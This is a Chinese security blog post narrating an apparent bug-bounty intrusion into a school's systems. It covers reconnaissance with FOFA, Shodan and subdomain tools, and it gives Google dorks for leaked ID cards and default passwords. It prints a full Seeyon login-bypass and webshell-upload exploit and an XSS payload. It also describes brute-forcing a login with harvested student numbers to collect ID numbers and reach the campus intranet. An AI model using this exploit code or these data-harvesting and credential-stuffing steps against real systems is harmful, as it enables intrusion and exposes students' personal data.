<div class="detail_content markdown-body editormd-preview-container" id="markdown-body">
<div id="app">
<h1 data-content="1" id="05b8b2f4cf9fe70a4866d57461feeac0">选择目标</h1>
<p>进入补天，选择一个目标</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20241102135704-49607f40-98df-1.png"/></p>
<h1 data-content="1" id="1bf347f325f122db7d7a626e31fd13a9">信息收集</h1>
<h2 data-content="1" id="bcb81cd7cb7fc13faac2033301f115e9">真实ip查找</h2>
<p>使用</p>
<pre><code>nslookup xxx.xxx.xxx</code></pre>
<p>虽然只有一个ip回显，但是访问后发现，尝试使用https，发现也不行，因为还没有打算跑流量，所以先放下</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20241102135719-523772ea-98df-1.png"/></p>
<h3 data-content="1" id="347f2273bafad842ee527658a61081dd">使用fofa证书序列号查找功能发现ip</h3>
<p>从这里进入</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20241102135728-57860ebe-98df-1.png"/></p>
<p>在详细信息里面找到序列号</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20241102135736-5c0b4d14-98df-1.png"/></p>
<p>拿百度的来说</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20241102135746-62570488-98df-1.png"/></p>
<p>去除冒号，将16进制转换为10进制</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20241102135755-67599eb4-98df-1.png"/></p>
<p>直接使用cert参数进行搜索，可以发现能够找到一些ip</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20241102135808-6f4d7942-98df-1.png"/></p>
<p>同理，使用该方法发现真实ip</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20241102135826-7a1480aa-98df-1.png"/></p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20241102135832-7db5f4e6-98df-1.png"/></p>
<h2 data-content="1" id="0a6de9652378e4a29b17b759e495e0b9">使用shodan直接查找ip段漏洞</h2>
<pre><code>shodan search --limit 100 --fields ip_str,port net:xxx.xxx.xxx.0/24 has_vuln:True</code></pre>
<p>参数解释</p>
<ul>
<li>
<code>shodan search</code>: 这是基本的搜索命令，用来启动 Shodan 查询。</li>
<li>
<code>--limit 100</code>: 这个选项告诉 Shodan 返回最多 100 个结果。默认情况下，Shodan 只返回 100 个结果，但是你可以通过这个参数来改变这个数量（取决于你的订阅级别）。</li>
<li>
<code>--fields ip_str,port</code>: 这个选项指定你想要在结果中包含哪些字段。在这个例子中，<code>ip_str</code> 是指设备的 IP 地址，<code>port</code> 是指开放的服务端口。</li>
<li>
<code>net:xxx.xxx.xxx.0/24</code>: 这是一个过滤器，用来查找属于某个特定网络段内的设备。<code>xxx.xxx.xxx.0/24</code> 指的是一个 CIDR 表示法的子网掩码，代表的是一个以 <code>xxx.xxx.xxx.</code> 开头的所有 IP 地址。例如，如果你输入 <code>192.168.1.0/24</code>，那么它将搜索所有 <code>192.168.1.*</code> 的 IP 地址。</li>
<li>
<code>has_vuln:True</code>: 这个过滤器用来查找已知存在漏洞的设备或服务。如果设置为 <code>True</code>，则只返回那些有已知安全漏洞的结果。<br/>
得到5条ip回显，进行访问后发现有一个不能使用了</li>
</ul>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20241102135914-96d18cec-98df-1.png"/></p>
<p>两个返回</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20241102135903-8fd5d272-98df-1.png"/></p>
<p>还有一个倒是正常的，但是图标不正常，是上海某某学校，时间原因就不去验证漏洞是否真的存在了<br/>
最后终于找到一个，不过是cve-2010的，都是关于iis的，嗯……，先跳过吧</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20241102135932-a15f0f7c-98df-1.png"/></p>
<h2 data-content="1" id="456da388f39c4186ee3041ea0880ee68">资产测绘</h2>
<p>使用quake进行资产测绘，进行二次测绘，域名和备案号，更加全面</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20241102135941-a69fd71e-98df-1.png"/></p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20241102135946-a9fa6d8e-98df-1.png"/></p>
<h2 data-content="1" id="0a7962af0143117cf271c95c5a88b30a">oneforall</h2>
<p>使用oneforall进行子域名查找，找到7890条子域名</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20241102135954-aecfc9da-98df-1.png"/></p>
<h2 data-content="1" id="2817775d9761d0fec98d855afc7ee31b">存活检测+去除多余子域名</h2>
<p>对二次资产测绘得到的数据和oneforall得到的数据进行去除，得到12697条数据，并且使用windfire进行存活检测，得到3437条数据</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20241102140012-b95fd02a-98df-1.png"/></p>
<p>这些大部分都是vpn登录页面的子域名，所以进行二次去重，最终得到162条数据</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20241102140021-bebea83e-98df-1.png"/></p>
<p>之后就是丢过去跑jsfind</p>
<h2 data-content="1" id="5c968b76e7756c693abed33abdf446c4">批量域名得ip，使用shodan搜索漏洞</h2>
<p>直接让人工智障写一个脚本，批量url执行nslookup得到去重ip</p>
<pre><code>import re
import subprocess
from urllib.parse import urlparse


def extract_domain(url):
    """从URL中提取域名，并去除端口号"""
    parsed_uri = urlparse(url)
    # 获取netloc并去除端口号
    domain = parsed_uri.netloc.split(':')[0]
    return domain


def get_ip_from_nslookup(domain):
    """使用nslookup命令获取域名对应的IP地址"""
    try:
        # 执行nslookup命令并获取输出
        nslookup_result = subprocess.check_output(['nslookup', domain], stderr=subprocess.STDOUT, text=True)

        # 查找IPv4地址
        ipv4_pattern = r'\b(?:\d{1,3}\.){3}\d{1,3}\b'
        ipv4_addresses = []
        addresses_started = False

        for line in nslookup_result.splitlines():
            if 'Address:' in line:
                addresses_started = True
                match = re.search(ipv4_pattern, line)
                if match:
                    ipv4_addresses.append(match.group(0))

        # 返回最后一个（即第二个）找到的IPv4地址
        if len(ipv4_addresses) &gt;= 2:
            return ipv4_addresses[1]  # 返回第二个IPv4地址

        return None
    except subprocess.CalledProcessError as e:
        print(f"Failed to resolve domain {domain}: {e.output}")
        return None


def process_urls(input_file, output_file):
    """处理输入文件中的URL，获取IP地址，并保存到输出文件中"""
    # 创建一个集合来存储唯一的IP地址
    unique_ips = set()

    with open(input_file, 'r') as file:
        for line in file:
            url = line.strip()
            if url:
                domain = extract_domain(url)
                ip_address = get_ip_from_nslookup(domain)
                if ip_address:
                    unique_ips.add(ip_address)

    # 将唯一IP地址写入新文件
    with open(output_file, 'w') as file:
        for ip in unique_ips:
            file.write(ip + '\n')


# 使用方法
input_file = 'urls.txt'  # 输入文件路径
output_file = 'resolved_ips.txt'  # 输出文件路径

process_urls(input_file, output_file)</code></pre>
<p>得到，有漏洞的ip，不过不太好利用，先跳过</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20241102140041-ca7db8c2-98df-1.png"/></p>
<h2 data-content="1" id="4e94ab447cf813b99e441d4d366018cf">Google搜索，得到大量学号</h2>
<p>得到一些敏感数据，比如默认密码，老师的电话之类的</p>
<pre><code>谷歌语法如下（直接copy即可）
site:.A.B.cn filetype:xls OR filetype:xlsx intext:身份证
site:.A.B.cn filetype:pdf OR filetype:doc OR filetype:docx intext:身份证
site:.A.B.cn filetype:xls OR filetype:xlsx "身份证"
site:.A.B.cn filetype:pdf OR filetype:doc OR filetype:docx "身份证"
site:.A.B.cn filetype:xls OR filetype:xlsx intitle:身份证
site:.A.B.cn filetype:pdf OR filetype:doc OR filetype:docx intitle:身份证

语法解释
site:指定域名
inurl:用于搜索包含的url关键词的网页
intitle:搜索网页标题中的关键字
intext:搜索网页正文中的关键字
filetype:按指定文件类型即文件后缀名搜索
cache:已经删除的缓存网页</code></pre>
<p>关键词可以替换为：<br/>
<strong>身份证|sfz|学号|xh|登录|注册|管理|平台|验证码|账号|系统|手册|默认密码|初始密码|password|联系电话|操作手册|vpn|名单</strong><br/>
得到大量的学号泄露，整理了一下，得到332条学号</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20241102140051-d0ae567a-98df-1.png"/></p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20241102140058-d49d53ee-98df-1.png"/></p>
<h1 data-content="1" id="1a610fe7ded5e442578e38ebd2727d54">寻找利用点</h1>
<h2 data-content="1" id="a4b0b3f3ba229cf15c64d38a3895df4f">尝试致远漏洞（登陆绕过+任意文件上传）</h2>
<p><a href="https://blog.csdn.net/bring_coco/article/details/140336176" target="_blank">https://blog.csdn.net/bring_coco/article/details/140336176</a></p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20241102140119-e100f23a-98df-1.png"/></p>
<p>exp</p>
<pre><code># coding:utf-8
import time
import requests
import re
import sys
import random
import zipfile


la = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; WOW64; rv:52.0) Gecko/20100101 Firefox/52.0',
           'Content-Type': 'application/x-www-form-urlencoded'}

def generate_random_str(randomlength=16):
  random_str = ''
  base_str = 'ABCDEFGHIGKLMNOPQRSTUVWXYZabcdefghigklmnopqrstuvwxyz0123456789'
  length = len(base_str) - 1
  for i in range(randomlength):
    random_str += base_str[random.randint(0, length)]
  return random_str

mm = generate_random_str(8)

webshell_name1 = mm+'.jsp'
webshell_name2 = '../'+webshell_name1

def file_zip():
    shell = 'test'   ## 替换shell内容
    zf = zipfile.ZipFile(mm+'.zip', mode='w', compression=zipfile.ZIP_DEFLATED)
    zf.writestr('layout.xml', "")
    zf.writestr(webshell_name2, shell)


def Seeyon_Getshell(urllist):

    url = urllist+'/seeyon/thirdpartyController.do'
    post = "method=access&amp;enc=TT5uZnR0YmhmL21qb2wvZXBkL2dwbWVmcy9wcWZvJ04+LjgzODQxNDMxMjQzNDU4NTkyNzknVT4zNjk0NzI5NDo3MjU4&amp;clientPath=127.0.0.1"
    response = requests.post(url=url, data=post, headers=la)
    if response and response.status_code == 200 and 'set-cookie' in str(response.headers).lower():
        cookie = response.cookies
        cookies = requests.utils.dict_from_cookiejar(cookie)
        jsessionid = cookies['JSESSIONID']
        file_zip()
        print( '获取cookie成功----&gt;&gt; '+jsessionid)
        fileurl = urllist+'/seeyon/fileUpload.do?method=processUpload&amp;maxSize='
        headersfile = {'Cookie': "JSESSIONID=%s" % jsessionid}
        post = {'callMethod': 'resizeLayout', 'firstSave': "true", 'takeOver': "false", "type": '0',
                'isEncrypt': "0"}
        file = [('file1', ('test.png', open(mm+'.zip', 'rb'), 'image/png'))]
        filego = requests.post(url=fileurl,data=post,files=file, headers=headersfile)
        time.sleep(2)
    else:
        print('获取cookie失败')
        exit()
    if filego.text:
        fileid1 = re.findall('fileurls=fileurls\+","\+\'(.+)\'', filego.text, re.I)
        fileid = fileid1[0]
        if len(fileid1) == 0:
            print('未获取到文件id可能上传失败！')
        print('上传成功文件id为----&gt;&gt;:'+fileid)
        Date_time = time.strftime('%Y-%m-%d')
        headersfile2 = {'Content-Type': 'application/x-www-form-urlencoded','Cookie': "JSESSIONID=%s" % jsessionid}
        getshellurl = urllist+'/seeyon/ajax.do'
        data = 'method=ajaxAction&amp;managerName=portalDesignerManager&amp;managerMethod=uploadPageLayoutAttachment&amp;arguments=%5B0%2C%22' + Date_time + '%22%2C%22' + fileid + '%22%5D'
        getshell = requests.post(url=getshellurl,data=data,headers=headersfile2)
        time.sleep(1)
        webshellurl1 = urllist + '/seeyon/common/designer/pageLayout/' + webshell_name1
        shelllist = requests.get(url=webshellurl1)
        if shelllist.status_code == 200:
            print('利用成功webshell地址：'+webshellurl1)
        else:
            print('未找到webshell利用失败')



def main():
    if (len(sys.argv) == 2):
        url = sys.argv[1]
        Seeyon_Getshell(url)
    else:
        print("python3 Seeyon_Getshell.py http://xx.xx.xx.xx")

if __name__ == '__main__':
    main()</code></pre>
<p>只能上传zip文件，不能解压，失败</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20241102140129-e74791d0-98df-1.png"/></p>
<h2 data-content="1" id="ea98a9a15618c247e62cb2ca208ef970">尝试rabbitmq未授权登录</h2>
<p>默认账号密码为guest/guest，失败</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20241102140136-eb0f5366-98df-1.png"/></p>
<h2 data-content="1" id="c820f17ad7030e832c79f7007d0618c1">xss</h2>
<p>反射型xss<br/>
发现一个查询框，尝试xss</p>
<pre><code>&gt;"'&gt;&lt;script&gt;alert('XSS')&lt;/script&gt;</code></pre>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20241102140144-f02f0cce-98df-1.png"/></p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20241102140152-f49b84c2-98df-1.png"/></p>
<h2 data-content="1" id="135ec1ef323a812499185ec6b6cd9b91">学号+弱口令进入，得到身份证</h2>
<p>看子域名的js的url时发现一个登录地址，查看操作说明，发现使用了默认密码</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20241102140201-fa00689c-98df-1.png"/></p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20241102140206-fd551cae-98df-1.png"/></p>
<p>随便尝试一下，直接登录成功，发现直接显示学号和身份证</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20241102140212-00e1cd40-98e0-1.png"/></p>
<p>而且登录的验证码有逻辑错误，第一次验证码正确以后都不验证，直接爆破，使用之前得到的332个学号，成功了118条学号</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20241102140220-05b2bca8-98e0-1.png"/></p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20241102140227-09df1f24-98e0-1.png"/></p>
<h2 data-content="1" id="4176bc9833d154d7bc0cc3c6c7b6d9db">登录校园网</h2>
<p>和大多数学校一样，校园网是学号+身份证后6位</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20241102140236-0f60ecca-98e0-1.png"/></p>
<p>随便尝试一下，直接成功，访问了学校的内网</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20241102140247-1562dc6e-98e0-1.png"/></p>
</div>
</div>